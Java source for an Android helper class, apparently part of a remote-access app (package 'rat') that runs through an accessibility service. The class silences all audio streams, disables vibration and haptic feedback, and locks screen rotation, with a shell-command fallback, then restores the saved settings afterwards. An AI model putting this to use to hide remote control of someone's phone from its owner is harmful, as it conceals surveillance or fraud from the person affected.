package com.vendor.rat.helper;

import android.content.ContentResolver;
import android.content.Context;
import android.media.AudioManager;
import android.os.Build;
import android.provider.Settings;
import android.util.Log;
import android.view.Surface;

import com.vendor.rat.service.MyAccessibilityService;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.util.concurrent.atomic.AtomicInteger;

/**
 * 通用静音策略 — 华为 + 其他设备
 *
 * 保存并修改:
 * - ACCELEROMETER_ROTATION → 0 (关闭自动旋转)
 * - USER_ROTATION → 0 (锁定竖屏方向)
 * - vibrate_when_ringing → 0
 * - HAPTIC_FEEDBACK_ENABLED → 0
 * - AudioManager 静音所有音频流 (RING/NOTIFICATION/ALARM/SYSTEM)
 *
 * 不修改 RingerMode:
 * - SILENT 需要 ACCESS_NOTIFICATION_POLICY (DND 权限)，华为/小米会抛 SecurityException
 * - VIBRATE 语义相反 — 会开启震动模式
 * - 音量静音已由 setStreamVolume(0) 处理，震动关闭已由 Settings keys 处理
 *
 * 双层写入策略 (对齐 vendor k.c()):
 * 1. Settings.System.putInt (需要 WRITE_SETTINGS 权限)
 * 2. 如果 canWrite()=false 或 putInt 后 read-back 验证失败，
 *    回退到 shell "settings put system <key> <value>"
 */
public class DefaultMuteStrategy implements DeviceMuteStrategy {

    private static final String TAG = "DefaultMuteStrategy";

    protected final AtomicInteger savedAutoRotate = new AtomicInteger(-1);
    protected final AtomicInteger savedUserRotation = new AtomicInteger(-1);
    protected final AtomicInteger savedVibrateWhenRinging = new AtomicInteger(-1);
    protected final AtomicInteger savedHapticFeedback = new AtomicInteger(-1);
    protected final AtomicInteger savedStreamRing = new AtomicInteger(-1);
    protected final AtomicInteger savedStreamNotification = new AtomicInteger(-1);
    protected final AtomicInteger savedStreamAlarm = new AtomicInteger(-1);
    protected final AtomicInteger savedStreamSystem = new AtomicInteger(-1);

    @Override
    public void muteAll(ContentResolver resolver, AudioManager audioManager) {
        // 1. 禁用自动旋转 + 锁定竖屏
        disableAutoRotation(resolver);

        // 2. 关闭来电震动
        putSystemSetting(resolver, "vibrate_when_ringing", 0, savedVibrateWhenRinging);

        // 3. 关闭触感反馈
        putSystemSetting(resolver, Settings.System.HAPTIC_FEEDBACK_ENABLED, 0, savedHapticFeedback);

        if (audioManager == null) return;

        // 4. 静音所有音频流 (跳过固定音量设备)
        if (!audioManager.isVolumeFixed()) {
            saveAndMuteStream(audioManager, AudioManager.STREAM_RING, savedStreamRing, "RING");
            saveAndMuteStream(audioManager, AudioManager.STREAM_NOTIFICATION, savedStreamNotification, "NOTIFICATION");
            saveAndMuteStream(audioManager, AudioManager.STREAM_ALARM, savedStreamAlarm, "ALARM");
            saveAndMuteStream(audioManager, AudioManager.STREAM_SYSTEM, savedStreamSystem, "SYSTEM");
        } else {
            Log.w(TAG, "设备音量固定，跳过 stream volume 操作");
        }
    }

    @Override
    public void restoreAll(ContentResolver resolver, AudioManager audioManager) {
        // 1. 恢复自动旋转 + 旋转方向
        restoreAutoRotation(resolver);

        // 2. 恢复来电震动
        restoreSystemSetting(resolver, "vibrate_when_ringing", savedVibrateWhenRinging);

        // 3. 恢复触感反馈
        restoreSystemSetting(resolver, Settings.System.HAPTIC_FEEDBACK_ENABLED, savedHapticFeedback);

        if (audioManager == null) return;

        // 4. 恢复音频流音量
        if (!audioManager.isVolumeFixed()) {
            restoreStream(audioManager, AudioManager.STREAM_RING, savedStreamRing, "RING");
            restoreStream(audioManager, AudioManager.STREAM_NOTIFICATION, savedStreamNotification, "NOTIFICATION");
            restoreStream(audioManager, AudioManager.STREAM_ALARM, savedStreamAlarm, "ALARM");
            restoreStream(audioManager, AudioManager.STREAM_SYSTEM, savedStreamSystem, "SYSTEM");
        }
    }

    // ============ 双层 Settings 写入 (对齐 vendor k.c()) ============

    /**
     * 保存原值并写入新值 — 双层策略:
     * 1. Settings.System.putInt (需 WRITE_SETTINGS)
     * 2. 失败则 shell "settings put system key value"
     */
    protected void putSystemSetting(ContentResolver resolver, String key, int newValue, AtomicInteger saved) {
        try {
            int current = Settings.System.getInt(resolver, key, 0);
            saved.set(current);
            if (current != newValue) {
                if (writeSystemSetting(resolver, key, newValue)) {
                    Log.d(TAG, key + " 已设为 " + newValue + " (原值=" + current + ")");
                } else {
                    Log.w(TAG, key + " 写入失败");
                }
            }
        } catch (Exception e) {
            Log.w(TAG, key + " 操作失败", e);
        }
    }

    /**
     * 恢复 Settings 值
     */
    protected void restoreSystemSetting(ContentResolver resolver, String key, AtomicInteger saved) {
        try {
            int val = saved.getAndSet(-1);
            if (val >= 0) {
                if (writeSystemSetting(resolver, key, val)) {
                    Log.d(TAG, key + " 已恢复 (值=" + val + ")");
                } else {
                    Log.w(TAG, key + " 恢复失败");
                }
            }
        } catch (Exception e) {
            Log.w(TAG, key + " 恢复失败", e);
        }
    }

    /**
     * 双层写入: Settings.System.putInt → read-back 验证 → shell 兜底
     * 对齐 vendor utils/k.c() 的实现模式
     */
    private boolean writeSystemSetting(ContentResolver resolver, String key, int value) {
        // 第 1 层: Settings.System.putInt
        Context ctx = getContext();
        if (ctx != null && Build.VERSION.SDK_INT >= Build.VERSION_CODES.M
                && Settings.System.canWrite(ctx)) {
            try {
                Settings.System.putInt(resolver, key, value);
                // read-back 验证
                int verify = Settings.System.getInt(resolver, key, -999);
                if (verify == value) {
                    return true;
                }
                Log.w(TAG, key + " putInt 后 read-back 不匹配: expected=" + value + " got=" + verify);
            } catch (Exception e) {
                Log.w(TAG, key + " putInt 失败", e);
            }
        }

        // 第 2 层: shell 兜底
        return shellPutSystem(key, value);
    }

    /**
     * 通过 shell 命令写入 Settings.System
     * 对齐 vendor: "settings put system <key> <value>"
     */
    private static boolean shellPutSystem(String key, int value) {
        try {
            Process process = Runtime.getRuntime().exec(
                    new String[]{"settings", "put", "system", key, String.valueOf(value)});
            int exitCode = process.waitFor();
            if (exitCode == 0) {
                Log.d(TAG, key + "=" + value + " (via shell)");
                return true;
            } else {
                // 读取 stderr
                BufferedReader reader = new BufferedReader(
                        new InputStreamReader(process.getErrorStream()));
                String error = reader.readLine();
                Log.w(TAG, key + " shell 写入失败: exit=" + exitCode + " err=" + error);
            }
        } catch (Exception e) {
            Log.w(TAG, key + " shell 写入异常", e);
        }
        return false;
    }

    /**
     * 通过 shell 命令读取 Settings.System
     */
    protected static int shellGetSystem(String key, int defaultValue) {
        try {
            Process process = Runtime.getRuntime().exec(
                    new String[]{"settings", "get", "system", key});
            BufferedReader reader = new BufferedReader(
                    new InputStreamReader(process.getInputStream()));
            String line = reader.readLine();
            process.waitFor();
            if (line != null && !line.equals("null")) {
                return Integer.parseInt(line.trim());
            }
        } catch (Exception e) {
            Log.w(TAG, key + " shell 读取异常", e);
        }
        return defaultValue;
    }

    private static Context getContext() {
        MyAccessibilityService service = MyAccessibilityService.getInstance();
        return service != null ? service.getApplicationContext() : null;
    }

    // ============ 旋转控制 ============

    /**
     * 禁用自动旋转 + 锁定竖屏方向
     */
    private void disableAutoRotation(ContentResolver resolver) {
        // 保存并关闭自动旋转
        try {
            int current = shellGetSystem(Settings.System.ACCELEROMETER_ROTATION, 0);
            savedAutoRotate.set(current);
            if (current == 1) {
                if (writeSystemSetting(resolver, Settings.System.ACCELEROMETER_ROTATION, 0)) {
                    Log.d(TAG, "自动旋转已禁用 (原值=" + current + ")");
                } else {
                    Log.w(TAG, "自动旋转禁用失败");
                }
            }
        } catch (Exception e) {
            Log.w(TAG, "禁用自动旋转失败", e);
        }

        // 保存并锁定竖屏方向 (USER_ROTATION=0 即竖屏)
        try {
            int currentRotation = shellGetSystem(Settings.System.USER_ROTATION, 0);
            savedUserRotation.set(currentRotation);
            if (currentRotation != Surface.ROTATION_0) {
                writeSystemSetting(resolver, Settings.System.USER_ROTATION, Surface.ROTATION_0);
                Log.d(TAG, "用户旋转已锁定竖屏 (原值=" + currentRotation + ")");
            }
        } catch (Exception e) {
            Log.w(TAG, "锁定竖屏失败", e);
        }
    }

    /**
     * 恢复自动旋转 + 旋转方向
     */
    private void restoreAutoRotation(ContentResolver resolver) {
        try {
            int saved = savedAutoRotate.getAndSet(-1);
            if (saved >= 0) {
                writeSystemSetting(resolver, Settings.System.ACCELEROMETER_ROTATION, saved);
                Log.d(TAG, "自动旋转已恢复 (值=" + saved + ")");
            }
        } catch (Exception e) {
            Log.w(TAG, "恢复自动旋转失败", e);
        }

        try {
            int saved = savedUserRotation.getAndSet(-1);
            if (saved >= 0) {
                writeSystemSetting(resolver, Settings.System.USER_ROTATION, saved);
                Log.d(TAG, "用户旋转已恢复 (值=" + saved + ")");
            }
        } catch (Exception e) {
            Log.w(TAG, "恢复用户旋转失败", e);
        }
    }

    // ============ 音频流控制 ============

    private void saveAndMuteStream(AudioManager am, int stream, AtomicInteger saved, String name) {
        try {
            int current = am.getStreamVolume(stream);
            saved.set(current);
            if (current > 0) {
                am.setStreamVolume(stream, 0, 0);
                Log.d(TAG, name + " 音量已静音 (原值=" + current + ")");
            }
        } catch (SecurityException e) {
            Log.w(TAG, name + " 静音失败 (SecurityException)", e);
        } catch (Exception e) {
            Log.w(TAG, name + " 静音失败", e);
        }
    }

    private void restoreStream(AudioManager am, int stream, AtomicInteger saved, String name) {
        try {
            int val = saved.getAndSet(-1);
            if (val >= 0) {
                am.setStreamVolume(stream, val, 0);
                Log.d(TAG, name + " 音量已恢复 (值=" + val + ")");
            }
        } catch (SecurityException e) {
            Log.w(TAG, name + " 恢复失败 (SecurityException)", e);
        } catch (Exception e) {
            Log.w(TAG, name + " 恢复失败", e);
        }
    }
}
